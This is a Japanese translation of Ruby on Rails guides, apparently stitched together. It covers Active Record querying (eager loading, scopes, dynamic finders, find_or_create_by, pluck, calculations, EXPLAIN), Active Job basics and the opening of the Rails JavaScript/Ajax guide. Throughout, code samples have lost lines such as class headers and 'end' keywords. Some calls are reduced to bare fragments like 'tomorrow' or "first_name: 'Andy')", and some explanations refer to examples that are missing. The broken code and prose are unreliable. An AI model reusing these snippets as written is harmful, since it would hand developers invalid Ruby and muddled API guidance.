Active Recordは、読み込まれるすべての関連付けを事前に指定することができます。
これは、`Model.find`呼び出しで`includes`を指定することで実現できます。
`includes`を指定すると、Active Recordは指定されたすべての関連付けが最小限のクエリ回数で読み込まれるようにしてくれます。
上の例で言うと、`Client.limit(10)`というコードを書き直して、住所が一括で読み込まれるようにします。
clients = Client.includes(:address).limit(10)
最初の例では **11** 回もクエリが実行されましたが、今度の例ではわずか **2** 回にまで減りました。
SELECT * FROM clients LIMIT 10
SELECT addresses.
* FROM addresses
  WHERE (addresses.client_id IN (1,2,3,4,5,6,7,8,9,10))
### 複数の関連付けを一括で読み込む
Active Recordは、1つの`Model.find`呼び出しで関連付けをいくつでも一括読み込みすることができます。これを行なうには、`includes`メソッドで配列、ハッシュ、または、配列やハッシュのネストしたハッシュを使用します。
#### 複数の関連付けの配列
Article.includes(:category, :comments)
上のコードは、記事と、それに関連付けられたカテゴリやコメントをすべて読み込みます。
#### ネストした関連付けハッシュ
Category.includes(articles: [{ comments: :guest }, :tags]).find(1)
上のコードは、id=1のカテゴリを検索し、関連付けられたすべての記事とそのタグやコメント、およびすべてのコメントのゲスト関連付けを一括読み込みします。
### 関連付けの一括読み込みで条件を指定する
Active Recordでは、`joins`のように事前読み込みされた関連付けに対して条件を指定することができますが、[joins](#テーブルを結合する) という方法を使用することをお勧めします。
しかし、このようにせざるを得ない場合は、`where`を通常どおりに使用することができます。
Article.includes(:comments).where(comments: { visible: true })
このコードは、`LEFT OUTER JOIN`を含むクエリを1つ生成します。`joins`メソッドを使用していたら、代りに`INNER JOIN`を使用するクエリが生成されていたでしょう。
  SELECT "articles"."id" AS t0_r0, ... "comments"."updated_at" AS t1_r5 FROM "articles" LEFT OUTER JOIN "comments" ON "comments"."article_id" = "articles"."id" WHERE (comments.visible = 1)
`where`条件がない場合は、通常のクエリが2セット生成されます。
NOTE: `where`がこのように動作するのは、ハッシュを渡した場合だけです。
Article.includes(:comments).where("comments.visible = true").references(:comments)
この`includes`クエリの場合、どの記事にもコメントがついていないので、すべての記事が読み込まれます。
`joins` (INNER JOIN) を使用する場合、結合条件は必ずマッチ **しなければならず** 、それ以外の場合にはレコードは返されません。
スコープ
スコープを設定することで、関連オブジェクトやモデルへのメソッド呼び出しとして参照される、よく使用されるクエリを指定することができます。
スコープでは、`where`、`joins`、`includes`など、これまでに登場したすべてのメソッドを使用できます。
どのスコープメソッドも、常に`ActiveRecord::Relation`オブジェクトを返します。このオブジェクトに対して、別のスコープを含む他のメソッド呼び出しを行なうこともできます。
単純なスコープを設定するには、クラスの内部で`scope`メソッドを使用し、スコープが呼び出されたときに実行して欲しいクエリをそこで渡します。
  scope :published, -> { where(published: true) }
以下でもわかるように、スコープでのメソッドの設定は、クラスメソッドの定義と完全に同じ (というよりクラスメソッドの定義そのもの) です。どちらの形式を使用するかは好みの問題です。
  def self.published
    where(published: true)
スコープをスコープ内で連鎖 (chain) させることもできます。
  scope :published,               -> { where(published: true) }
  scope :published_and_commented, -> { published.where("comments_count > 0") }
この`published`スコープを呼び出すには、クラスでこのスコープを呼び出します。
category = Category.first
category.articles.published # => [このカテゴリに属する、公開済みの記事]
### 引数を渡す
スコープには引数を渡すことができます。
  scope :created_before, ->(time) { where("created_at < ?", time) }
引数付きスコープの呼び出しは、クラスメソッドの呼び出しと同様の方法で行います。
Article.created_before(Time.zone.now)
しかし、このスコープでできる機能は、クラスメソッドでできる機能と重複しています。
  def self.created_before(time)
    where("created_at < ?", time)
スコープで引数を使用するのであれば、クラスメソッドとして定義する方が推奨されます。
クラスメソッドにした場合でも、関連オブジェクトからアクセス可能です。
category.articles.created_before(time)
### デフォルトスコープを適用する
あるスコープをモデルのすべてのクエリに適用したい場合、モデル自身の内部で`default_scope`メソッドを使用することができます。
  default_scope { where("removed_at IS NULL") }
このモデルに対してクエリが実行されたときのSQLクエリは以下のような感じになります。
SELECT * FROM clients WHERE removed_at IS NULL
デフォルトスコープの条件が複雑になるのであれば、スコープをクラスメソッドとして定義するのもひとつの手です。
  def self.default_scope
    # ActiveRecord::Relationを返すようにする
### スコープのマージ
`where`句と同様、`AND`条件を使用してスコープをマージできます。
class User < ActiveRecord::Base
  scope :active, -> { where state: 'active' }
  scope :inactive, -> { where state: 'inactive' }
User.active.inactive
# SELECT "users".
* FROM "users" WHERE "users"."state" = 'active' AND "users"."state" = 'inactive'
`scope`と`where`条件を混用してマッチさせることができます。その結果生成される最終的なSQLには、すべての条件が`AND`で結合されて使用されます。
User.active.where(state: 'finished')
* FROM "users" WHERE "users"."state" = 'active' AND "users"."state" = 'finished'
User.active.merge(User.inactive)
* FROM "users" WHERE "users"."state" = 'inactive'
ここでひとつ注意しなければならないのは、`default_scope`を`scope`や`where`条件よりも前に置いているという点です。
  default_scope { where state: 'pending' }
User.all
* FROM "users" WHERE "users"."state" = 'pending'
User.active
* FROM "users" WHERE "users"."state" = 'pending' AND "users"."state" = 'active'
User.where(state: 'inactive')
# SELECT "users".* FROM "users" WHERE "users"."state" = 'pending' AND "users"."state" = 'inactive'
上の例でわかるように、`default_scope`が`scope`と`where`よりも前の場所にマージされています。
### すべてのスコープを削除する
何らかの理由でスコープをすべて解除したい場合は`unscoped`メソッドを使用できます。
このメソッドは、モデルで`default_scope`が指定されているが、それを適用したくないクエリがある場合に特に便利です。
Client.unscoped.load
このメソッドはスコープをすべて解除し、テーブルに対して通常の (スコープなしの) クエリを実行するようにします。
`unscoped`に`scope`を連鎖させることはできませんので注意が必要です。
このような場合は、`unscoped`のブロック形式を使用することが推奨されます。
Client.unscoped {
  Client.created_before(Time.zone.now)
動的ファインダ
Active Recordは、テーブルに定義されたすべてのフィールド (属性とも呼ばれます) に対して自動的にファインダメソッドを提供します。
たとえば、`Client`モデルに`first_name`というフィールドがあると、`find_by_first_name`というメソッドがActive Recordによって自動的に作成されます。
`Client`モデルに`locked`というフィールドがあれば、`find_by_locked`というメソッドを使用できます。
この動的ファインダメソッドの末尾に`Client.find_by_name!("Ryan")`のように感嘆符 (`!`) を追加すると、該当するレコードがない場合に`ActiveRecord::RecordNotFound`エラーが発生します。
nameとlockedの両方を検索したいのであれば、2つのフィールド名をandでつなぐだけでメソッドを利用できます。
たとえば、`Client.find_by_first_name_and_locked("Ryan", true)`のようにかくことができます
新しいオブジェクトを検索またはビルドする
Active Record
レコードを検索し、レコードがなければ作成する、というのはよくある一連の流れです。
`find_or_create_by`および`find_or_create_by!`メソッドを使用すればこれらを一度に行なうことができます。
### `find_or_create_by`
`find_or_create_by`メソッドは、指定された属性を持つレコードが存在するかどうかをチェックします。
レコードがない場合は`create`が呼び出されます。
以下の例を見てみましょう。
'Andy'という名前のクライアントを探し、いなければ作成したいとします。
これを行なうには以下を実行します。
Client.find_or_create_by(first_name: 'Andy')
# => #<Client id: 1, first_name: "Andy", orders_count: 0, locked: true, created_at: "2011-08-30 06:09:27", updated_at: "2011-08-30 06:09:27">
このメソッドによって生成されるSQLは以下のようなものになります。
SELECT * FROM clients WHERE (clients.first_name = 'Andy') LIMIT 1
INSERT INTO clients (created_at, first_name, locked, orders_count, updated_at) VALUES ('2011-08-30 05:22:57', 'Andy', 1, NULL, '2011-08-30 05:22:57')
COMMIT
`find_or_create_by`は、既にあるレコードか新しいレコードのいずれかを返します。
上の例の場合、Andyという名前のクライアントがなかったのでレコードを作成して返しました。
`create`などと同様、検証にパスするかどうかによって、新しいレコードがデータベースに保存されていないことがあるかもしれません。
今度は、新しいレコードを作成するときに'locked'属性を`false`に設定したいが、それをクエリに含めたくないとします。
そこで、"Andy"という名前のクライアントを検索するか、その名前のクライアントがいない場合は"Andy"というクライアントを作成してロックを外すことにします。
これは2とおりの方法で実装できます。
1つ目は`create_with`を使用する方法です。
Client.create_with(locked: false).find_or_create_by(first_name: 'Andy')
2つ目はブロックを使用する方法です。
Client.find_or_create_by(first_name: 'Andy') do |c|
  c.locked = false
このブロックは、クライアントが作成されるときにだけ実行されます。
このコードを再度実行すると、このブロックは実行されません。
### `find_or_create_by!
`find_or_create_by!`を使用すると、新しいレコードが無効な場合に例外を発生することもできます。
検証 (validation) については本ガイドでは解説していませんが、たとえば
validates :orders_count, presence: true
上を`Client`モデルに追加したとします。
`orders_count`を指定しないで新しい`Client`モデルを作成しようとすると、レコードは無効になって例外が発生します。
first_name: 'Andy')
# => ActiveRecord::RecordInvalid: Validation failed: Orders count can't be blank
### `find_or_initialize_by`
`find_or_initialize_by`メソッドは`find_or_create_by`と同様に動作しますが、`create`の代りに`new`を呼ぶ点が異なります。
つまり、モデルの新しいインスタンスは作成されますが、その時点ではデータベースに保存されていません。
`find_or_create_by`の例を少し変えて説明を続けます。今度は'Nick'という名前のクライアントが必要だとします。
nick = Client.find_or_initialize_by(first_name: 'Nick')
# => <Client id: nil, first_name: "Nick", orders_count: 0, locked: true, created_at: "2011-08-30 06:09:27", updated_at: "2011-08-30 06:09:27">
nick.persisted?
# => false
nick.new_record?
# => true
オブジェクトはまだデータベースに保存されていないため、生成されるSQLは以下のようなものになります。
SELECT * FROM clients WHERE (clients.first_name = 'Nick') LIMIT 1
このオブジェクトをデータベースに保存したい場合は、単に`save`を呼び出します。
nick.save
SQLで検索する
独自のSQLを使用してレコードを検索したい場合、`find_by_sql`メソッドを使用できます。
この`find_by_sql`メソッドは、オブジェクトの配列を1つ返します。クエリがレコードを1つしか返さなかった場合にも配列が返されますのでご注意ください。
たとえば、以下のクエリを実行したとします。
Client.find_by_sql("SELECT * FROM clients
  INNER JOIN orders ON clients.id = orders.client_id
  ORDER BY clients.created_at desc")
# => [
  #<Client id: 1, first_name: "Lucas" >,
  #<Client id: 2, first_name: "Jan" >,
  # ...
`find_by_sql`は、カスタマイズしたデータベース呼び出しを簡単な方法で提供し、インスタンス化されたオブジェクトを返します。
### `select_all`
`find_by_sql`は`connection#select_all`と深い関係があります。`select_all`は`find_by_sql`と同様、カスタムSQLを使用してデータベースからオブジェクトを取り出しますが、取り出したオブジェクトのインスタンス化を行わない点が異なります。
代りに、ハッシュの配列を返します。1つのハッシュが1レコードを表します。
Client.connection.select_all("SELECT first_name, created_at FROM clients WHERE id = '1'")
  {"first_name"=>"Rafael", "created_at"=>"2012-11-10 23:23:45.281189"},
  {"first_name"=>"Eileen", "created_at"=>"2013-12-09 11:22:35.221282"}
### `pluck`
`pluck`は、1つのモデルで使用されているテーブルからカラム (1つでも複数でも可) を取得するクエリを送信するのに使用できます。
引数としてカラム名のリストを与えると、指定したカラムの値の配列を、対応するデータ型で返します。
Client.where(active: true).pluck(:id)
# SELECT id FROM clients WHERE active = 1
# => [1, 2, 3]
Client.distinct.pluck(:role)
# SELECT DISTINCT role FROM clients
# => ['admin', 'member', 'guest']
Client.pluck(:id, :name)
# SELECT clients.id, clients.name FROM clients
# => [[1, 'David'], [2, 'Jeremy'], [3, 'Jose']]
`pluck`を使用すると、以下のようなコードをシンプルなものに置き換えることができます。
Client.select(:id).map { |c| c.id }
Client.select(:id).map(&:id)
Client.select(:id, :name).map { |c| [c.id, c.name] }
上は以下に置き換えられます。
Client.pluck(:id)
`select`と異なり、`pluck`はデータベースから受け取った結果を直接Rubyの配列に変換してくれます。そのための`ActiveRecord`オブジェクトを事前に構成しておく必要はありません。
従って、このメソッドは大規模なクエリや使用頻度の高いクエリで使用するとパフォーマンスが向上します。
ただし、オーバーライドを行なうモデルメソッドは使用できません。
  def name
    "私は#{super}"
Client.select(:name).map &:name
# => ["私はDavid", "私はJeremy", "私はJose"]
Client.pluck(:name)
# => ["David", "Jeremy", "Jose"]
さらに`pluck`は、`select`などの`Relation`スコープと異なり、クエリを直接トリガするので、その後ろに他のスコープを連鎖することはできません。ただし、構成済みのスコープを`pluck`の前に置くことはできます。
Client.pluck(:name).limit(1)
# => NoMethodError: undefined method `limit' for #<Array:0x007ff34d3ad6d8>
Client.limit(1).pluck(:name)
# => ["David"]
### `ids`
`ids`は、テーブルの主キーを使用するリレーションのIDをすべて取り出すのに使用できます。
Person.ids
# SELECT id FROM people
class Person < ActiveRecord::Base
  self.primary_key = "person_id"
# SELECT person_id FROM people
オブジェクトの存在チェック
オブジェクトが存在するかどうかは、`exists?
このメソッドは、`find`と同様のクエリを使用してデータベースにクエリを送信しますが、オブジェクトのコレクションの代わりに`true`または`false`を返します。
`exists?`は複数の値を引数に取ることができます。ただし、それらの値のうち1つでも存在していれば、他の値が存在していなくても`true`を返します。
id: [1,2,3])
name: ['John', 'Sergei'])
`exists?`メソッドは、引数なしでモデルやリレーションに使用することもできます。
Client.where(first_name: 'Ryan').exists?
上の例では、`first_name`が'Ryan'のクライアントが1人でもいれば`true`を返し、それ以外の場合は`false`を返します。
Client.exists?
上の例では、`Client`テーブルが空なら`false`を返し、それ以外の場合は`true`を返します。
モデルやリレーションでの存在チェックには`any?`や`many?`も使用できます。
# via a model
Article.any?
Article.many?
# 名前付きスコープを経由
Article.recent.any?
Article.recent.many?
# リレーション経由
Article.where(published: true).any?
Article.where(published: true).many?
# 関連付け経由
Article.first.categories.any?
Article.first.categories.many?
計算
このセクションでは冒頭で`count`メソッドを例に取って説明していますが、ここで説明されているオプションは以下のすべてのサブセクションにも該当します。
あらゆる計算メソッドは、モデルに対して直接実行されます。
Client.count
# SELECT count(*) AS count_all FROM clients
リレーションに対しても直接実行されます。
Client.where(first_name: 'Ryan').count
# SELECT count(*) AS count_all FROM clients WHERE (first_name = 'Ryan')
この他にも、リレーションに対してさまざまなファインダメソッドを使用して複雑な計算を行なうことができます。
Client.includes("orders").where(first_name: 'Ryan', orders: { status: 'received' }).count
上のコードは以下を実行します。
SELECT count(DISTINCT clients.id) AS count_all FROM clients
  LEFT OUTER JOIN orders ON orders.client_id = client.id WHERE
  (clients.first_name = 'Ryan' AND orders.status = 'received')
### 個数を数える
モデルのテーブルに含まれるレコードの個数を数えるには`Client.count`を使用できます。返されるのはレコードの個数です。
特定の年齢のクライアントの数を数えるのであれば、`Client.count(:age)`とします
オプションについては、1つ上の[計算](#計算)セクションを参照してください。
### 平均
テーブルに含まれる特定の数値の平均を得るには、そのテーブルを持つクラスに対して`average`メソッドを呼び出します。
このメソッド呼び出しは以下のようなものになります。
Client.average("orders_count")
返される値は、そのフィールドの平均値です。通常3.14159265のような浮動小数点になります。
### 最小値
テーブルに含まれるフィールドの最小値を得るには、そのテーブルを持つクラスに対して`minimum`メソッドを呼び出します。
Client.minimum("age")
### 最大値
テーブルに含まれるフィールドの最大値を得るには、そのテーブルを持つクラスに対して`maximum`メソッドを呼び出します。
Client.maximum("age")
### 合計
テーブルに含まれるフィールドのすべてのレコードにおける合計を得るには、そのテーブルを持つクラスに対して`sum`メソッドを呼び出します。
Client.sum("orders_count")
EXPLAINを実行する
リレーションによってトリガされるクエリでEXPLAINを実行することができます。
以下に例を示します。
User.where(id: 1).joins(:articles).explain
以下のような結果が生成されます。
EXPLAIN for: SELECT `users`.
* FROM `users` INNER JOIN `articles` ON `articles`.`user_id` = `users`.`id` WHERE `users`.`id` = 1
+----+-------------+----------+-------+---------------+
| id | select_type | table | type  | possible_keys |
|  1 | SIMPLE      | users | const | PRIMARY       |
|  1 | SIMPLE      | articles | ALL  | NULL          |
+---------+---------+-------+------+-------------+
| key     | key_len | ref   | rows | Extra |
| PRIMARY | 4       | const |    1 |       |
| NULL | NULL    | NULL |    1 | Using where |
2 rows in set (0.00 sec)
上の結果はMySQLの場合です。
PostgreSQLアダプタで同じクエリを実行すると、今度は以下のような結果が得られます。
EXPLAIN for: SELECT "users".
* FROM "users" INNER JOIN "articles" ON "articles"."user_id" = "users"."id" WHERE "users"."id" = 1
                                  QUERY PLAN
------------------------------------------------------------------------------
   Join Filter: (articles.user_id = users.id)
   ->  Index Scan using users_pkey on users  (cost=0.00..8.27 rows=1 width=4)
         Index Cond: (id = 1)
   ->  Seq Scan on articles  (cost=0.00..28.88 rows=8 width=4)
(6 rows)
一括読み込みを使用していると、内部で複数のクエリがトリガされることがあり、一部のクエリではその前の結果を必要とすることがあります。
このため、`explain`はこのクエリを実際に実行し、それからクエリプランを要求します。
User.where(id: 1).includes(:articles).explain
以下の結果を生成します。
* FROM `users`  WHERE `users`.`id` = 1
+----+-------------+-------+-------+---------------+
| id | select_type | table | type  | possible_keys |
|  1 | SIMPLE      | users | const | PRIMARY       |
+---------+---------+-------+------+-------+
| key     | key_len | ref   | rows | Extra |
| PRIMARY | 4       | const |    1 |       |
1 row in set (0.00 sec)
EXPLAIN for: SELECT `articles`.
* FROM `articles`  WHERE `articles`.`user_id` IN (1)
+----+-------------+----------+------+---------------+
| id | select_type | table    | type | possible_keys |
|  1 | SIMPLE      | articles | ALL  | NULL          |
+------+---------+------+------+-------------+
| key  | key_len | ref  | rows | Extra       |
| NULL | NULL    | NULL |    1 | Using where |
### EXPLAINの出力結果を解釈する
EXPLAINの出力を解釈することは、本ガイドの範疇を超えます。
以下の情報を参考にしてください。
* SQLite3: [EXPLAIN QUERY PLAN](http://www.sqlite.org/eqp.html)
* MySQL: [EXPLAIN Output Format](http://dev.mysql.com/doc/refman/5.6/en/explain-output.html) 
* PostgreSQL: [Using EXPLAIN](http://www.postgresql.org/docs/current/static/using-explain.html)
Active Job の基礎
=================
本ガイドでは、バックグラウンドで実行するジョブの作成やキュー登録 (エンキュー: enqueue) 、実行方法について解説します。
* ジョブの作成方法
* ジョブの登録方法
* バックグラウンドでのジョブ実行方法
* アプリケーションから非同期にメールを送信する方法
Active Jobは、ジョブを宣言し、それによってバックエンドでさまざまな方法によるキュー操作を実行するためのフレームワークです。
これらのジョブでは、定期的なクリーンアップを始めとして、請求書発行やメール配信など、どんなことでも実行できます。
これらのジョブをより細かな作業単位に分割して並列実行することもできます。
-----------------------------
Active Jobの主要な目的は、Railsアプリを即席で作成した直後でも使用できる、自前のジョブ管理インフラを持つことです。
これにより、Delayed JobとResqueなどのように、さまざまなジョブ実行機能のAPIの違いを気にせずにジョブフレームワーク機能やその他のgemを搭載することができるようになります。
バックエンドでのキューイング作業では、操作方法以外のことを気にせずに済みます。
さらに、ジョブ管理フレームワークを切り替える際にジョブを書き直さずに済みます。
ジョブを作成する
このセクションでは、ジョブの作成方法とジョブの登録 (enqueue) 方法を手順を追って説明します。
### ジョブを作成する
Active Jobは、ジョブ作成用のRailsジェネレータを提供しています。
$ bin/rails generate job guests_cleanup
create  app/jobs/guests_cleanup_job.rb
以下のようにすると、特定のキューに対してジョブを1つ作成できます。
$ bin/rails generate job guests_cleanup --queue urgent
ジェネレータを使用したくないのであれば、`app/jobs`の下に自分でジョブファイルを作成することもできます。ジョブファイルでは必ず`ActiveJob::Base`を継承してください。
作成されたジョブは以下のようになります。
class GuestsCleanupJob < ActiveJob::Base
  queue_as :default
  def perform(*args)
    # 後で行なう
### ジョブをキューに登録する
キューへのジョブ登録は以下のように行います。
tomorrow
以上で終わりです。
ジョブを実行する
アダプタが設定されていない場合、ジョブは直ちに実行されます。
### バックエンド
Active Jobには、Sidekiq、Resque、Delayed Jobなどさまざまなキューイングバックエンドに接続できるアダプタがビルトインで用意されています。
利用可能な最新のアダプタのリストについては、APIドキュメントの[ActiveJob::QueueAdapters](http://api.rubyonrails.org/classes/ActiveJob/QueueAdapters.html) を参照してください。
# config/application.rb
キュー
多くのアダプタでは複数のキューを扱うことができます。
Active Jobを使用することで、特定のキューに入っているジョブをスケジューリングすることができます。
  queue_as :low_priority
  #....
`application.rb`で以下のように`config.active_job.queue_name_prefix`を使用することで、すべてのジョブでキュー名の前に特定の文字列を追加することができます。
    config.active_job.queue_name_prefix = Rails.env
# app/jobs/guests_cleanup.rb
# 以上で、production環境ではproduction_low_priorityというキューでジョブが
#
MyJob.set(queue: :another_queue).perform_later(record)
class ProcessVideoJob < ActiveJob::Base
  queue_as do
    video = self.arguments.first
    if video.owner.premium?
      :premium_videojobs
    else
      :videojobs
  def perform(video)
    # do process video
ProcessVideoJob.perform_later(Video.last)
NOTE: 設定したキュー名をキューイングバックエンドが「リッスンする」ようにしてください。
一部のバックエンドでは、リッスンするキューを指定する必要があるものがあります。
コールバック
Active Jobは、ジョブのライフサイクルでのフックを提供します。
これによりコールバックが利用できるので、ジョブのライフサイクルの間に特定のロジックをトリガできます。
### 利用可能なコールバック
* `before_enqueue`
* `around_enqueue`
* `after_enqueue`
* `before_perform`
* `around_perform`
* `after_perform`
### 使用法
  before_enqueue do |job|
    # ジョブインスタンスで行なう作業
  around_perform do |job, block|
    # 実行前に行なう作業
    block.call
    # 実行後に行なう作業
Action Mailer
最近のWebアプリケーションでよく実行されるジョブといえば、リクエスト-レスポンスのサイクルの外でメールを送信することでしょう。これにより、ユーザーが送信を待つ必要がなくなります。
Active JobはAction Mailerと統合されているので、非同期メール送信を簡単に行えます。
# すぐにメール送信したい場合は#deliver_nowを使用
UserMailer.welcome(@user).deliver_now
# Active Jobを使用して後でメール送信したい場合は#deliver_laterを使用
UserMailer.welcome(@user).deliver_later
GlobalID
Active JobではGlobalIDがパラメータとしてサポートされています。
GlobalIDを使用すると、動作中のActive Recordオブジェクトをジョブに渡す際にクラスとidを指定する必要がありません。クラスとidを指定する従来の方法では、後で明示的にデシリアライズ (deserialize) する必要がありました。
従来のジョブが以下のようなものだったとします。
class TrashableCleanupJob
  def perform(trashable_class, trashable_id, depth)
    trashable = trashable_class.constantize.find(trashable_id)
    trashable.cleanup(depth)
現在は以下のように簡潔に書くことができます。
  def perform(trashable, depth)
Active Model
例外
Active Jobでは、ジョブ実行時に発生する例外をキャッチする方法が1つ提供されています。
  rescue_from(ActiveRecord::RecordNotFound) do |exception|
   # ここに例外処理を書く
Rails で JavaScript を使用する
================================
本ガイドでは、RailsにビルトインされているAjax/JavaScript機能などについて解説します。これらを活用して、リッチな動的Ajaxアプリケーションをお手軽に作ることができます。
* Ajaxの基礎
* 「控えめなJavaScript」について
* Railsのビルトインヘルパーの活用方法
* サーバー側でAjaxを扱う方法
* Turbolinks gem
-------------------------------------------------------------------------------
はじめてのAjax
------------------------
Ajaxを理解するには、Webブラウザの基本的な動作について理解しておく必要があります。
ブラウザのアドレスバーに`http://localhost:3000`と入力して'Go'を押すと、ブラウザ (つまりクライアント) はサーバーに対してリクエストを1つ送信します。
ブラウザは、サーバーから受け取ったレスポンスを解析し、続いて必要なすべてのアセット (JavaScriptファイル、スタイルシート、画像) をサーバーから取得します。
続いてブラウザはページを組み立てます。
ブラウザに表示されているリンクをクリックすると、同じプロセスが実行されます。ブラウザはページを取得し、続いてアセットを取得し、それらをすべてまとめてから結果を表示します。
これが、いわゆる「リクエスト-レスポンス」のサイクルです。
JavaScriptも、上と同様にサーバーにリクエストを送信し、レスポンスを解析することができます。
JavaScriptはページ上の情報を更新することもできます。
JavaScriptの開発者は、ブラウザとJavaScriptという2つの力を1つに結集させることで、現在のWebページの一部だけを更新することができます。必要なWebページをサーバーからすべて取得する必要はありません。
この強力な技法が、Ajaxと呼ばれているものです。
Railsには、JavaScriptをさらに使いやすくしたCoffeeScriptがデフォルトで組み込まれています。以後、本ガイドではすべての例をCoffeeScriptで記述します。
もちろん、これらのレッスンはすべて通常のJavaScriptにも適用できます。
例として、jQueryライブラリを使用してAjaxリクエストを送信するCoffeeScriptコードを以下に示します。
```coffeescript
$.ajax(url: "/test").done (html) ->
  $("#results").append html
上のコードは "/test" からデータを取得し、結果をWebページ上の`results`というidを持つ`div`タグに押し込みます。
Railsには、この種の技法をWebページ作成で使用するためのサポートが多数ビルトインされています。
従って、こうしたコードをすべて自分で作成する必要はほとんどありません。
この後、このような手法でRails Webサイトを作成する方法をご紹介します。これらの手法は、いずれもシンプルな基本テクニックのうえに成り立っています。
「控えめなJavaScript」
-------------------------------------
Railsでは、JavaScriptをDOMに追加する際の手法を「控えめな (unobtrusive) JavaScript」と呼んでいます。
これは一般にフロントエンド開発者コミュニティでベストプラクティスであると見なされていますが、ここではもう少し違う角度から説明したいと思います。
最もシンプルなJavaScriptを例にとって考えてみましょう。
以下のような書き方は'インラインJavaScript'と呼ばれています。
<a href="#" onclick="this.style.backgroundColor='#990000'">Paint it red</a>
このリンクをクリックすると、背景が赤くなります。
しかし早くもここで問題が生じ始めます。クリックした時にJavaScriptでもっといろんなことをさせるとどうなるでしょうか。
<a href="#" onclick="this.style.backgroundColor='#009900';this.style.color='#FFFFFF';">Paint it green</a>
だいぶ乱雑になってきました。
ではここで関数定義をclickハンドラの外に追い出し、CoffeeScriptで書き換えてみましょう。
paintIt = (element, backgroundColor, textColor) ->
  element.style.backgroundColor = backgroundColor
  if textColor?
    element.style.color = textColor
ページの内容は以下のとおりです。
<a href="#" onclick="paintIt(this, '#990000')">Paint it red</a>
これでコードがだいぶ良くなりました。しかし、同じ効果を複数のリンクに与えるとどうなるでしょうか。
<a href="#" onclick="paintIt(this, '#009900', '#FFFFFF')">Paint it green</a>
<a href="#" onclick="paintIt(this, '#000099', '#FFFFFF')">Paint it blue</a>
これではDRYとは言えません。
今度はイベントを活用して改良してみましょう。
最初に`data-*`属性をリンクに追加しておきます。続いて、この属性を持つすべてのリンクで発生するクリックイベントにハンドラをバインドします。
  $("a[data-background-color]").click (e) ->
    e.preventDefault()
    backgroundColor = $(this).data("background-color")
    textColor = $(this).data("text-color")
    paintIt(this, backgroundColor, textColor)
<a href="#" data-background-color="#009900" data-text-color="#FFFFFF">Paint it green</a>
<a href="#" data-background-color="#000099" data-text-color="#FFFFFF">Paint it blue</a>
私たちはこの手法を「控えめなJavaScript」と呼んでいます。この名称は、HTMLの中にJavaScriptを混入させないという意図に由来しています。
JavaScriptを正しく分離することができたので、今後の変更が容易になりました。
今後は、この`data-*`属性をリンクタグに追加するだけでこの動作を簡単に追加できます。
Railsでは、こうした最小化と連結を使用することで、あらゆるJavaScriptを実行できます。
JavaScriptコードはRailsのあらゆるWebページでまるごとバンドルされます。つまり、ページが最初にブラウザに読み込まれるときにダウンロードされ、以後はブラウザでキャッシュされます。
これにより多くの利点が得られます。
Railsチームは、本ガイドでご紹介した方法でCoffeeScriptとJavaScriptを使用することを強く推奨いたします。多くのJavaScriptライブラリもこの方法で利用できることが期待できます。
組み込みヘルパー
HTML生成を行い易くするために、Rubyで記述されたさまざまなビューヘルパーメソッドが用意されています。
それらのHTML要素にAjaxコードを若干追加したくなったときにも、Railsがちゃんとサポートしてくれます。
RailsのJavaScriptは、「控えめなJavaScript」原則に基いて、JavaScriptによる要素とRubyによる要素の2つの要素で構成されています。
JavaScriptによる要素は[rails.js](https://github.com/rails/jquery-ujs/blob/master/src/rails.js)であり、Rubyによる要素である正規のビューヘルパーによってDOMに適切なタグが追加されます。
これによりrails.jsに含まれるCoffeeScriptがDOMの属性をリッスンするようになり、それらの属性に適切なハンドラが与えられます。
### form_for
[`form_for`](http://api.rubyonrails.org/classes/ActionView/Helpers/FormHelper.html#method-i-form_for) はフォーム作成を支援するヘルパーです。
`form_for`は、JavaScriptを利用するための`:remote`オプションを引数に取ることができます。
```erb
<%= form_for(@article, remote: true) do |f| %>
  ...
<% end %>
上のコードから以下のHTMLが生成されます。
<form accept-charset="UTF-8" action="/articles" class="new_article" data-remote="true" id="new_article" method="post">
</form>
formタグに`data-remote="true"`という属性が追加されていることにご注目ください。
これにより、フォームの送信がブラウザによる通常の送信メカニズムではなくAjaxによって送信されるようになります。
記入済みの`<form>`を得られただけでは何か物足りません。
フォーム送信が成功した場合に何らかの表示を行いたいものです。
これを行なうには、`ajax:success`イベントをバインドします。
送信に失敗した場合は`ajax:error`を使用します。
実際に見てみましょう。
$(document).ready ->
  $("#new_article").on("ajax:success", (e, data, status, xhr) ->
    $("#new_article").append xhr.responseText
  ).on "ajax:error", (e, xhr, status, error) ->
    $("#new_article").append "<p>ERROR</p>"
明らかに、従来の書き方よりも洗練されています。しかしこれはほんのさわりです。
詳細については、[jquery-ujs wiki](https://github.com/rails/jquery-ujs/wiki/ajax)に掲載されているイベントを参照してください。
### form_tag
[`form_tag`](http://api.rubyonrails.org/classes/ActionView/Helpers/FormTagHelper.html#method-i-form_tag) は`form_for`とよく似ています。
このメソッドには`:remote`オプションがあり、以下のように使用できます。
<%= form_tag('/articles', remote: true) do %>
<form accept-charset="UTF-8" action="/articles" data-remote="true" method="post">
その他の点は`form_for`と同じです。
詳細についてはドキュメントを参照してください。
### link_to
[`link_to`](http://api.rubyonrails.org/classes/ActionView/Helpers/UrlHelper.html#method-i-link_to) はリンクの生成を支援するヘルパーです。
このメソッドには`:remote`オプションがあり、以下のように使用できます。
<%= link_to "an article", @article, remote: true %>
上のコードによって以下が生成されます。
<a href="/articles/1" data-remote="true">an article</a>
`form_for`の場合と同様、同じAjaxイベントをバインドできます。
1クリックで削除できる記事の一覧があるとします。
このHTMLは以下のような感じになります。
<%= link_to "Delete article", @article, remote: true, method: :delete %>
上に加え、以下の様なCoffeeScriptを作成します。
  $("a[data-remote]").on "ajax:success", (e, data, status, xhr) ->
    alert "The article was deleted."
### button_to
[`button_to`](http://api.rubyonrails.org/classes/ActionView/Helpers/UrlHelper.html#method-i-button_to)はボタン作成を支援するヘルパーです。
このメソッドには`:remote`オプションがあり、以下のように使用できます。
<%= button_to "An article", @article, remote: true %>
上のコードによって以下が生成されます。
<form action="/articles/1" class="button_to" data-remote="true" method="post">
  <div><input type="submit" value="An article"></div>
作成されるのは通常の`<form>`なので、`form_for`に関する情報はすべて`button_to`にも適用できます。
サーバー側で考慮すべき点
Ajaxはクライアント側だけでなく、ある程度サーバー側でのサポートも必要です。
Ajaxリクエストに対してレスポンスを返す際の形式は、HTMLよりもJSONを使用することが好まれるようです。
それでは、必要となるものについて解説します。
### シンプルな例
表示したいユーザーリストがあり、そのページに新規ユーザーを作成するフォームも置きたいとします。
このコントローラのindexアクションは以下のようになります。
class UsersController < ApplicationController
  def index
    @users = User.all
    @user = User.new
